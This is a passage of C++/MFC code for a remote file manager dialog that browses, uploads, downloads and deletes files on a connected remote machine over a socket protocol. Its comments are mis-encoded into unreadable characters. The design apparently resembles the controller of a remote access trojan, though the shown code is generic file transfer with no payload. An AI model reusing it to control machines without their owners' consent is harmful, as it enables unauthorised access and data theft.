	m_list_remote.DeleteAllItems();
	// ����Column
	while(m_list_remote.DeleteColumn(0) != 0);
	m_list_remote.InsertColumn(0, "�W��",  LVCFMT_LEFT, 200);
	m_list_remote.InsertColumn(1, "����", LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(2, "�`�j�p", LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(3, "�i�ΪŶ�", LVCFMT_LEFT, 115);


	char	*pDrive = NULL;
	pDrive = (char *)m_bRemoteDriveList;

	unsigned long		AmntMB = 0; // �`�j�p
	unsigned long		FreeMB = 0; // �Ѿl�Ŷ�
	char				VolName[MAX_PATH];
	char				FileSystem[MAX_PATH];

	/*
	6	DRIVE_FLOPPY
	7	DRIVE_REMOVABLE
	8	DRIVE_FIXED
	9	DRIVE_REMOTE
	10	DRIVE_REMOTE_DISCONNECT
	11	DRIVE_CDROM
	*/
	int	nIconIndex = -1;
	for (int i = 0; pDrive[i] != '\0';)
	{
		if (pDrive[i] == 'A' || pDrive[i] == 'B')
		{
			nIconIndex = 6;
		}
		else
		{
			switch (pDrive[i + 1])
			{
			case DRIVE_REMOVABLE:
				nIconIndex = 7;
				break;
			case DRIVE_FIXED:
				nIconIndex = 8;
				break;
			case DRIVE_REMOTE:
				nIconIndex = 9;
				break;
			case DRIVE_CDROM:
				nIconIndex = 11;
				break;
			default:
				nIconIndex = 8;
				break;		
			}
		}	
		CString	str;
		str.Format("%c:\\", pDrive[i]);
		int	nItem = m_list_remote.InsertItem(i, str, nIconIndex);
		m_list_remote.SetItemData(nItem, 1);
	
		memcpy(&AmntMB, pDrive + i + 2, 4);
		memcpy(&FreeMB, pDrive + i + 6, 4);
		str.Format("%10.1f GB", (float)AmntMB / 1024);
		m_list_remote.SetItemText(nItem, 2, str);
		str.Format("%10.1f GB", (float)FreeMB / 1024);
		m_list_remote.SetItemText(nItem, 3, str);
		
		i += 10;

		char	*lpFileSystemName = NULL;
		char	*lpTypeName = NULL;

		lpTypeName = pDrive + i;
		i += lstrlen(pDrive + i) + 1;
		lpFileSystemName = pDrive + i;

		// �ϽL����, ���ŴN��ܺϽL�W��
		if (lstrlen(lpFileSystemName) == 0)
		{
			m_list_remote.SetItemText(nItem, 1, lpTypeName);
		}
		else
		{
			m_list_remote.SetItemText(nItem, 1, lpFileSystemName);
		}


		i += lstrlen(pDrive + i) + 1;
	}
	// ���m���{���e���|
	m_Remote_Path = "";
	m_Remote_Directory_ComboBox.ResetContent();

	ShowMessage("���{�G�˸��ؿ� %s ����", m_Remote_Path);
}

void CFileManagerDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	CoUninitialize();
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);

	CDialog::OnClose();
}

CString CFileManagerDlg::GetParentDirectory(CString strPath)
{
	CString	strCurPath = strPath;
	int Index = strCurPath.ReverseFind('\\');
	if (Index == -1)
	{
		return strCurPath;
	}
	CString str = strCurPath.Left(Index);
	Index = str.ReverseFind('\\');
	if (Index == -1)
	{
		strCurPath = "";
		return strCurPath;
	}
	strCurPath = str.Left(Index);
	
	if(strCurPath.Right(1) != "\\")
		strCurPath += "\\";
	return strCurPath;
}
void CFileManagerDlg::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_FILE_LIST: // ���C��
		FixedRemoteFileList
			(
			m_pContext->m_DeCompressionBuffer.GetBuffer(0),
			m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1
			);
		break;
	case TOKEN_FILE_SIZE: // �ǿ���ɪ��Ĥ@�Ӽƾڥ]�A���j�p�A�Τ��W
		CreateLocalRecvFile();
		break;
	case TOKEN_FILE_DATA: // ��󤺮e
		WriteLocalRecvFile();
		break;
	case TOKEN_TRANSFER_FINISH: // �ǿ駹��
		EndLocalRecvFile();
		break;
	case TOKEN_CREATEFOLDER_FINISH:
		GetRemoteFileList(".");
		break;
	case TOKEN_DELETE_FINISH:
		EndRemoteDeleteFile();
		break;
	case TOKEN_GET_TRANSFER_MODE:
		SendTransferMode();
		break;
	case TOKEN_DATA_CONTINUE:
		SendFileData();
		break;
	case TOKEN_RENAME_FINISH:
		// ��s���{���C��
		GetRemoteFileList(".");
		break;
	default:
		SendException();
		break;
	}
}

void CFileManagerDlg::GetRemoteFileList(CString directory)
{
	if (directory.GetLength() == 0)
	{
		int	nItem = m_list_remote.GetSelectionMark();

		// �p�G���襤���A�O�ؿ�
		if (nItem != -1)
		{
			if (m_list_remote.GetItemData(nItem) == 1)
			{
				directory = m_list_remote.GetItemText(nItem, 0);
			}
		}
		// �q�զX�ظ̱o����|
		else
		{
			m_Remote_Directory_ComboBox.GetWindowText(m_Remote_Path);
		}
	}
	// �o����ؿ�
	if (directory == "..")
	{
		m_Remote_Path = GetParentDirectory(m_Remote_Path);
	}
	else if (directory != ".")
	{	
		m_Remote_Path += directory;
		if(m_Remote_Path.Right(1) != "\\")
			m_Remote_Path += "\\";
	}
	
	// �O�X�ʾ����ڥؿ�,��^�ϽL�C��
	if (m_Remote_Path.GetLength() == 0)
	{
		FixedRemoteDriveList();
		return;
	}

	// �o�e�ƾګe�M�Žw�İ�

	int	PacketSize = m_Remote_Path.GetLength() + 2;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, PacketSize);

	bPacket[0] = COMMAND_LIST_FILES;
	memcpy(bPacket + 1, m_Remote_Path.GetBuffer(0), PacketSize - 1);
	m_iocpServer->Send(m_pContext, bPacket, PacketSize);
	LocalFree(bPacket);

	m_Remote_Directory_ComboBox.InsertString(0, m_Remote_Path);
	m_Remote_Directory_ComboBox.SetCurSel(0);
	
	// �o���^�ƾګe�T���f
	m_list_remote.EnableWindow(FALSE);
	m_ProgressCtrl->SetPos(0);
}
void CFileManagerDlg::OnDblclkListRemote(NMHDR* pNMHDR, LRESULT* pResult) 
{
	if (m_list_remote.GetSelectedCount() == 0 || m_list_remote.GetItemData(m_list_remote.GetSelectionMark()) != 1)
		return;
	// TODO: Add your control notification handler code here
	GetRemoteFileList();
	*pResult = 0;
}

void CFileManagerDlg::FixedRemoteFileList(BYTE *pbBuffer, DWORD dwBufferLen)
{
	// ���s�]�mImageList
	SHFILEINFO	sfi;
	HIMAGELIST hImageListLarge = (HIMAGELIST)SHGetFileInfo(NULL, 0, &sfi,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_LARGEICON);
	HIMAGELIST hImageListSmall = (HIMAGELIST)SHGetFileInfo(NULL, 0, &sfi,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
	ListView_SetImageList(m_list_remote.m_hWnd, hImageListLarge, LVSIL_NORMAL);
	ListView_SetImageList(m_list_remote.m_hWnd, hImageListSmall, LVSIL_SMALL);

	// ���ؼ��D
	m_list_remote.DeleteAllItems();
	while(m_list_remote.DeleteColumn(0) != 0);
	m_list_remote.InsertColumn(0, "�W��",  LVCFMT_LEFT, 200);
	m_list_remote.InsertColumn(1, "�j�p", LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(2, "����", LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(3, "�ק���", LVCFMT_LEFT, 115);


	int	nItemIndex = 0;
	m_list_remote.SetItemData
		(
		m_list_remote.InsertItem(nItemIndex++, "..", GetIconIndex(NULL, FILE_ATTRIBUTE_DIRECTORY)),
		1
		);
	/*
	ListView �����{�{
	��s�ƾګe��SetRedraw(FALSE)   
	��s��ե�SetRedraw(TRUE)
	*/
	m_list_remote.SetRedraw(FALSE);

	if (dwBufferLen != 0)
	{
		// 
		for (int i = 0; i < 2; i++)
		{
			// ���LToken�A�@5�r�`
			char *pList = (char *)(pbBuffer + 1);			
			for(char *pBase = pList; pList - pBase < dwBufferLen - 1;)
			{
				char	*pszFileName = NULL;
				DWORD	dwFileSizeHigh = 0; // ��󰪦r�`�j�p
				DWORD	dwFileSizeLow = 0; // ���C�r�`�j�p
				int		nItem = 0;
				bool	bIsInsert = false;
				FILETIME	ftm_strReceiveLocalFileTime;

				int	nType = *pList ? FILE_ATTRIBUTE_DIRECTORY : FILE_ATTRIBUTE_NORMAL;
				// i �� 0 �ɡA�C�ؿ��Ai��1�ɦC���
				bIsInsert = !(nType == FILE_ATTRIBUTE_DIRECTORY) == i;
				pszFileName = ++pList;

				if (bIsInsert)
				{
					nItem = m_list_remote.InsertItem(nItemIndex++, pszFileName, GetIconIndex(pszFileName, nType));
					m_list_remote.SetItemData(nItem, nType == FILE_ATTRIBUTE_DIRECTORY);
					SHFILEINFO	sfi;
					SHGetFileInfo(pszFileName, FILE_ATTRIBUTE_NORMAL | nType, &sfi,sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);   
					m_list_remote.SetItemText(nItem, 2, sfi.szTypeName);
				}

				// �o����j�p
				pList += lstrlen(pszFileName) + 1;
				if (bIsInsert)
				{
					memcpy(&dwFileSizeHigh, pList, 4);
					memcpy(&dwFileSizeLow, pList + 4, 4);
					CString strSize;
					strSize.Format("%10d KB", (dwFileSizeHigh * (MAXDWORD+1)) / 1024 + dwFileSizeLow / 1024 + (dwFileSizeLow % 1024 ? 1 : 0));
					m_list_remote.SetItemText(nItem, 1, strSize);
					memcpy(&ftm_strReceiveLocalFileTime, pList + 8, sizeof(FILETIME));
					CTime	time(ftm_strReceiveLocalFileTime);
					m_list_remote.SetItemText(nItem, 3, time.Format("%Y-%m-%d %H:%M"));	
				}
				pList += 16;
			}
		}
	}

	m_list_remote.SetRedraw(TRUE);
	// ��_���f
	m_list_remote.EnableWindow(TRUE);

	ShowMessage("���{�G�˸��ؿ� %s ����", m_Remote_Path);
}

void CFileManagerDlg::ShowMessage(char *lpFmt, ...)
{
	char buff[1024];
    va_list    arglist;
    va_start( arglist, lpFmt );
	
	memset(buff, 0, sizeof(buff));

	vsprintf(buff, lpFmt, arglist);
	m_wndStatusBar.SetPaneText(0, buff);
    va_end( arglist );
}

void CFileManagerDlg::OnLocalPrev() 
{
	// TODO: Add your command handler code here
	FixedLocalFileList("..");
}

void CFileManagerDlg::OnRemotePrev() 
{
	// TODO: Add your command handler code here
	GetRemoteFileList("..");
}

void CFileManagerDlg::OnLocalView() 
{
	// TODO: Add your command handler code here
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_ICON);
}

// �b�u����W���ToolTip
BOOL CFileManagerDlg::OnToolTipNotify(UINT id, NMHDR* pNMHDR, LRESULT* pResult)
{
	ASSERT(pNMHDR->code == TTN_NEEDTEXTA || pNMHDR->code == TTN_NEEDTEXTW);
	//���W�@�h����ص��f�u���B�z�Ӯ���
	if (GetRoutingFrame() != NULL)
	return FALSE;


	//��ANSI and UNICODE��ӳB�z����
	TOOLTIPTEXTA* pTTTA = (TOOLTIPTEXTA*)pNMHDR;
	TOOLTIPTEXTW* pTTTW = (TOOLTIPTEXTW*)pNMHDR;
	TCHAR szFullText[256];

	CString strTipText;
	UINT nID = pNMHDR->idFrom;

	//�p�GidFrom�O�@�Ӥl���f�A�h�o���ID�C

	if (
		pNMHDR->code == TTN_NEEDTEXTA 
		&& (pTTTA->uFlags & TTF_IDISHWND) 
		|| pNMHDR->code == TTN_NEEDTEXTW 
		&& (pTTTW->uFlags & TTF_IDISHWND)
		)
	{
		//idFrom�O�u������y�`	
		nID = ::GetDlgCtrlID((HWND)nID);
	}

	if (nID != 0) //�Y�O0�A���@���j��A���O���s
	{
		//�o��nID�������r�Ŧ�
		AfxLoadString(nID, szFullText);
		//�q�W���o�쪺�r�Ŧꤤ���XTooltip�ϥΪ��奻
		AfxExtractSubString(strTipText, szFullText, 1, '\n');	
	}

	//�ƻs�����X���奻
	#ifndef _UNICODE
	if (pNMHDR->code == TTN_NEEDTEXTA)
	lstrcpyn(pTTTA->szText, strTipText, sizeof(pTTTA->szText));
	else
	_mbstowcsz(pTTTW->szText, strTipText, sizeof(pTTTW->szText));
	#else
	if (pNMHDR->code == TTN_NEEDTEXTA)
	_wcstombsz(pTTTA->szText, strTipText, sizeof(pTTTA->szText));
	else
	lstrcpyn(pTTTW->szText, strTipText, sizeof(pTTTW->szText));
	#endif
	*pResult = 0;
	//���Tooltip���f
	::SetWindowPos(pNMHDR->hwndFrom, HWND_TOP, 0, 0, 0, 0, SWP_NOACTIVATE|SWP_NOSIZE|SWP_NOMOVE);
	return TRUE; //�����B�z����
}

//////////////////////////////////�H�U���u�����T���B�z//////////////////////////////////////////
void CFileManagerDlg::OnLocalList() 
{
	// TODO: Add your command handler code here
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_LIST);	
}

void CFileManagerDlg::OnLocalReport() 
{
	// TODO: Add your command handler code here
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_REPORT);	
}

void CFileManagerDlg::OnLocalBigicon() 
{
	// TODO: Add your command handler code here
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_ICON);	
}

void CFileManagerDlg::OnLocalSmallicon() 
{
	// TODO: Add your command handler code here
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_SMALLICON);	
}

void CFileManagerDlg::OnRemoteList() 
{
	// TODO: Add your command handler code here
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_LIST);	
}

void CFileManagerDlg::OnRemoteReport() 
{
	// TODO: Add your command handler code here
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_REPORT);	
}

void CFileManagerDlg::OnRemoteBigicon() 
{
	// TODO: Add your command handler code here
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_ICON);	
}

void CFileManagerDlg::OnRemoteSmallicon() 
{
	// TODO: Add your command handler code here
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_SMALLICON);	
}

void CFileManagerDlg::OnRemoteView() 
{
	// TODO: Add your command handler code here
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_ICON);
}


// ���ڥؿ��ɸT�ΦV�W���s
void CFileManagerDlg::OnUpdateLocalPrev(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(m_Local_Path.GetLength() && m_list_local.IsWindowEnabled());
}

void CFileManagerDlg::OnUpdateLocalDelete(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	// ���O�ڥؿ��A�åB��ܶ��ؤj��0
	pCmdUI->Enable(m_Local_Path.GetLength() && m_list_local.GetSelectedCount()  && m_list_local.IsWindowEnabled());		
}

void CFileManagerDlg::OnUpdateLocalNewfolder(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(m_Local_Path.GetLength() && m_list_local.IsWindowEnabled());
}

void CFileManagerDlg::OnUpdateLocalCopy(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here

	pCmdUI->Enable
		(
		m_list_local.IsWindowEnabled()
		&& (m_Remote_Path.GetLength() || m_list_remote.GetSelectedCount()) // ���{���|���šA�Ϊ̦����
		&& m_list_local.GetSelectedCount()// ���a���|���šA�Ϊ̦����
		);
}


void CFileManagerDlg::OnUpdateLocalStop(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(!m_list_local.IsWindowEnabled() && m_bIsUpload);

}

void CFileManagerDlg::OnUpdateRemotePrev(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(m_Remote_Path.GetLength() && m_list_remote.IsWindowEnabled());
}

void CFileManagerDlg::OnUpdateRemoteCopy(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	// ���O�ڥؿ��A�åB��ܶ��ؤj��0
	pCmdUI->Enable
		(
		m_list_remote.IsWindowEnabled()
		&& (m_Local_Path.GetLength() || m_list_local.GetSelectedCount()) // ���a���|���šA�Ϊ̦����
		&& m_list_remote.GetSelectedCount() // ���{���|���šA�Ϊ̦����
		);	
}

void CFileManagerDlg::OnUpdateRemoteDelete(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	// ���O�ڥؿ��A�åB��ܶ��ؤj��0
	pCmdUI->Enable(m_Remote_Path.GetLength() && m_list_remote.GetSelectedCount() && m_list_remote.IsWindowEnabled());		
}

void CFileManagerDlg::OnUpdateRemoteNewfolder(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(m_Remote_Path.GetLength() && m_list_remote.IsWindowEnabled());
}

void CFileManagerDlg::OnUpdateRemoteStop(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(!m_list_remote.IsWindowEnabled() && !m_bIsUpload);
}
bool CFileManagerDlg::FixedUploadDirectory(LPCTSTR lpPathName)
{
	char	lpszFilter[MAX_PATH];
	char	*lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));

	if (lpPathName[lstrlen(lpPathName) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";
	
	wsprintf(lpszFilter, "%s%s*.*", lpPathName, lpszSlash);

	
	WIN32_FIND_DATA	wfd;
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // �p�G�S�����άd�䥢��
		return FALSE;
	
	do
	{ 
		if (wfd.cFileName[0] == '.') 
			continue; // �L�o�o��ӥؿ� 
		if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
		{ 
			char strDirectory[MAX_PATH];
			wsprintf(strDirectory, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName); 
			FixedUploadDirectory(strDirectory); // �p�G��쪺�O�ؿ��A�h�i�J���ؿ��i�滼�k 
		} 
		else 
		{ 
			CString file;
			file.Format("%s%s%s", lpPathName, lpszSlash, wfd.cFileName); 
			//printf("send file %s\n",strFile);
			m_Remote_Upload_Job.AddTail(file);
			// ����i��ާ@ 
		} 
	} while (FindNextFile(hFind, &wfd)); 
	FindClose(hFind); // �����d��y�`
	return true;
}

void CFileManagerDlg::EnableControl(BOOL bEnable)
{
	m_list_local.EnableWindow(bEnable);
	m_list_remote.EnableWindow(bEnable);
	m_Local_Directory_ComboBox.EnableWindow(bEnable);
	m_Remote_Directory_ComboBox.EnableWindow(bEnable);
}
void CFileManagerDlg::OnLocalCopy() 
{
	m_bIsUpload = true;
	// TODO: Add your command handler code here

	// TODO: Add your command handler code here
	// �p�GDrag���A���Drop��F���Ӥ��
	if (m_nDropIndex != -1 && m_pDropList->GetItemData(m_nDropIndex))
		m_hCopyDestFolder = m_pDropList->GetItemText(m_nDropIndex, 0);
	// ���m�W�ǥ��ȦC��
	m_Remote_Upload_Job.RemoveAll();
	POSITION pos = m_list_local.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int nItem = m_list_local.GetNextSelectedItem(pos);
		CString	file = m_Local_Path + m_list_local.GetItemText(nItem, 0);
		// �p�G�O�ؿ�
		if (m_list_local.GetItemData(nItem))
		{
			file += '\\';
			FixedUploadDirectory(file.GetBuffer(0));
		}
		else
		{
			// �K�[��W�ǥ��ȦC�����h
			m_Remote_Upload_Job.AddTail(file);
		}

	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memory
	if (m_Remote_Upload_Job.IsEmpty())
	{
		::MessageBox(m_hWnd, "��󧨬���", "ĵ�i", MB_OK|MB_ICONWARNING);
		return;
	}
	EnableControl(FALSE);
	SendUploadJob();
}

//////////////// ���ǿ�ާ@ ////////////////
// �u�޵o�X�F�U�������
// �@�Ӥ@�ӵo�A������U�������ɡA�U���ĤG�Ӥ�� ...
void CFileManagerDlg::OnRemoteCopy()
{
	m_bIsUpload = false;
	// �T�Τ��޲z���f
	EnableControl(FALSE);

	// TODO: Add your command handler code here
	// �p�GDrag���A���Drop��F���Ӥ��
	if (m_nDropIndex != -1 && m_pDropList->GetItemData(m_nDropIndex))
		m_hCopyDestFolder = m_pDropList->GetItemText(m_nDropIndex, 0);
	// ���m�U�����ȦC��
	m_Remote_Download_Job.RemoveAll();
	POSITION pos = m_list_remote.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int nItem = m_list_remote.GetNextSelectedItem(pos);
		CString	file = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
		// �p�G�O�ؿ�
		if (m_list_remote.GetItemData(nItem))
			file += '\\';
		// �K�[��U�����ȦC�����h
		m_Remote_Download_Job.AddTail(file);
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memory

	// �o�e�Ĥ@�ӤU������
	SendDownloadJob();
}

// �o�X�@�ӤU������
BOOL CFileManagerDlg::SendDownloadJob()
{

	if (m_Remote_Download_Job.IsEmpty())
		return FALSE;

	// �o�X�Ĥ@�ӤU�����ȩR�O
	CString file = m_Remote_Download_Job.GetHead();
	int		nPacketSize = file.GetLength() + 2;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
 	bPacket[0] = COMMAND_DOWN_FILES;
 	// ��󰾲��A��Ǯɥ�
 	memcpy(bPacket + 1, file.GetBuffer(0), file.GetLength() + 1);
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);

	LocalFree(bPacket);
	// �q�U�����ȦC�����R���ۤv
	m_Remote_Download_Job.RemoveHead();
	return TRUE;
}

// �o�X�@�ӤW�ǥ���
BOOL CFileManagerDlg::SendUploadJob()
{
	if (m_Remote_Upload_Job.IsEmpty())
		return FALSE;

	CString	strDestDirectory = m_Remote_Path;
	// �p�G���{�]����ܡA�����ؼФ��
	int nItem = m_list_remote.GetSelectionMark();
	
	// �O���
	if (nItem != -1 && m_list_remote.GetItemData(nItem) == 1)
	{
		strDestDirectory += m_list_remote.GetItemText(nItem, 0) + "\\";
	}
	
	if (!m_hCopyDestFolder.IsEmpty())
	{
		strDestDirectory += m_hCopyDestFolder + "\\";
	}

	// �o�X�Ĥ@�ӤU�����ȩR�O
	m_strOperatingFile = m_Remote_Upload_Job.GetHead();
	
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	// 1 �r�`token, 8�r�`�j�p, ���W��, '\0'
	HANDLE	hFile;
	CString	fileRemote = m_strOperatingFile; // ���{���
	// �o��n�O�s�쪺���{�������|
	fileRemote.Replace(m_Local_Path, strDestDirectory);
	m_strUploadRemoteFile = fileRemote;
	hFile = CreateFile(m_strOperatingFile.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	dwSizeLow =	GetFileSize (hFile, &dwSizeHigh);
	m_nOperatingFileLength = (dwSizeHigh * (MAXDWORD+1)) + dwSizeLow;

	CloseHandle(hFile);
	// �c�y�ƾڥ]�A�o�e������
	int		nPacketSize = fileRemote.GetLength() + 10;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);
	
	bPacket[0] = COMMAND_FILE_SIZE;
	memcpy(bPacket + 1, &dwSizeHigh, sizeof(DWORD));
	memcpy(bPacket + 5, &dwSizeLow, sizeof(DWORD));
	memcpy(bPacket + 9, fileRemote.GetBuffer(0), fileRemote.GetLength() + 1);
	
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);

	LocalFree(bPacket);

	// �q�U�����ȦC�����R���ۤv
	m_Remote_Upload_Job.RemoveHead();
	return TRUE;
}

// �o�X�@�ӧR������
BOOL CFileManagerDlg::SendDeleteJob()
{
	if (m_Remote_Delete_Job.IsEmpty())
		return FALSE;
	// �o�X�Ĥ@�ӤU�����ȩR�O
	CString file = m_Remote_Delete_Job.GetHead();
	int		nPacketSize = file.GetLength() + 2;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);

	if (file.GetAt(file.GetLength() - 1) == '\\')
	{
		ShowMessage("���{�G�R���ؿ� %s\*.* ����", file);
		bPacket[0] = COMMAND_DELETE_DIRECTORY;
	}
	else
	{
		ShowMessage("���{�G�R����� %s ����", file);
		bPacket[0] = COMMAND_DELETE_FILE;
	}
	// ��󰾲��A��Ǯɥ�
	memcpy(bPacket + 1, file.GetBuffer(0), nPacketSize - 1);
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);
	
	LocalFree(bPacket);
	// �q�U�����ȦC�����R���ۤv
	m_Remote_Delete_Job.RemoveHead();
	return TRUE;
}

void CFileManagerDlg::CreateLocalRecvFile()
{
	// ���m�p�ƾ�
	m_nCounter = 0;

	CString	strDestDirectory = m_Local_Path;
	// �p�G���a�]����ܡA�����ؼФ��
	int nItem = m_list_local.GetSelectionMark();

	// �O���
	if (nItem != -1 && m_list_local.GetItemData(nItem) == 1)
	{
		strDestDirectory += m_list_local.GetItemText(nItem, 0) + "\\";
	}

	if (!m_hCopyDestFolder.IsEmpty())
	{
		strDestDirectory += m_hCopyDestFolder + "\\";
	}

	FILESIZE	*pFileSize = (FILESIZE *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwSizeHigh = pFileSize->dwSizeHigh;
	DWORD	dwSizeLow = pFileSize->dwSizeLow;

	m_nOperatingFileLength = (dwSizeHigh * (MAXDWORD+1)) + dwSizeLow;

	// ���e���ާ@�����W
	m_strOperatingFile = m_pContext->m_DeCompressionBuffer.GetBuffer(9);

	m_strReceiveLocalFile = m_strOperatingFile;

	// �o��n�O�s�쪺���a�������|
	m_strReceiveLocalFile.Replace(m_Remote_Path, strDestDirectory);
	
	// �Ыئh�h�ؿ�
	MakeSureDirectoryPathExists(m_strReceiveLocalFile.GetBuffer(0));


	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strReceiveLocalFile.GetBuffer(0), &FindFileData);


	if (hFind != INVALID_HANDLE_VALUE
		&& m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL 
		&& m_nTransferMode != TRANSFER_MODE_ADDITION_ALL
		&& m_nTransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{

		CFileTransferModeDlg	dlg(this);
		dlg.m_strFileName = m_strReceiveLocalFile;
		switch (dlg.DoModal())
		{
		case IDC_OVERWRITE:
			m_nTransferMode = TRANSFER_MODE_OVERWRITE;
			break;
		case IDC_OVERWRITE_ALL:
			m_nTransferMode = TRANSFER_MODE_OVERWRITE_ALL;
			break;
		case IDC_ADDITION:
			m_nTransferMode = TRANSFER_MODE_ADDITION;
			break;
		case IDC_ADDITION_ALL:
			m_nTransferMode = TRANSFER_MODE_ADDITION_ALL;
			break;
		case IDC_JUMP:
			m_nTransferMode = TRANSFER_MODE_JUMP;
			break;
		case IDC_JUMP_ALL:
			m_nTransferMode = TRANSFER_MODE_JUMP_ALL;
			break;
		case IDC_CANCEL:
			m_nTransferMode = TRANSFER_MODE_CANCEL;
			break;
		}
	}

	if (m_nTransferMode == TRANSFER_MODE_CANCEL)
	{
		// �����ǰe
		m_bIsStop = true;
		SendStop();
		return;
	}
	int	nTransferMode;
	switch (m_nTransferMode)
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_ADDITION_ALL:
		nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;
		break;
	default:
		nTransferMode = m_nTransferMode;
	}

	//  1�r�`Token,�|�r�`�������|��A�|�r�`�����C�|��
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; // ��󥴶}�覡 
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = COMMAND_CONTINUE;

	// ���w�g�s�b
	if (hFind != INVALID_HANDLE_VALUE)
	{
		// �����I����
		// �p�G�O���
		if (nTransferMode == TRANSFER_MODE_ADDITION)
		{
			memcpy(bToken + 1, &FindFileData.nFileSizeHigh, 4);
			memcpy(bToken + 5, &FindFileData.nFileSizeLow, 4);
			// ���������׻��W
			m_nCounter += FindFileData.nFileSizeHigh * (MAXDWORD+1);
			m_nCounter += FindFileData.nFileSizeLow;

			dwCreationDisposition = OPEN_EXISTING;
		}
		// �л\
		else if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			// �����m0
			memset(bToken + 1, 0, 8);
			// ���s�Ы�
			dwCreationDisposition = CREATE_ALWAYS;
			
		}
		// ���L�A���w����-1
		else if (nTransferMode == TRANSFER_MODE_JUMP)
		{
			m_ProgressCtrl->SetPos(100);
			DWORD dwOffset = -1;
			memcpy(bToken + 5, &dwOffset, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{
		// �����m0
		memset(bToken + 1, 0, 8);
		// ���s�Ы�
		dwCreationDisposition = CREATE_ALWAYS;
	}
	FindClose(hFind);


	HANDLE	hFile = 
		CreateFile
		(
		m_strReceiveLocalFile.GetBuffer(0), 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		dwCreationDisposition,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	// �ݭn���~�B�z
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_nOperatingFileLength = 0;
		m_nCounter = 0;
		::MessageBox(m_hWnd, m_strReceiveLocalFile + " ���Ыإ���", "ĵ�i", MB_OK|MB_ICONWARNING);
		return;
	}
	CloseHandle(hFile);

	ShowProgress();
	if (m_bIsStop)
		SendStop();
	else
	{
		// �o�e�~��ǿ���token,�]�t�����Ǫ�����
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
}
// �g�J��󤺮e

void CFileManagerDlg::WriteLocalRecvFile()
{

	// �ǿ駹��
	BYTE	*pData;
	DWORD	dwBytesToWrite;
	DWORD	dwBytesWrite;
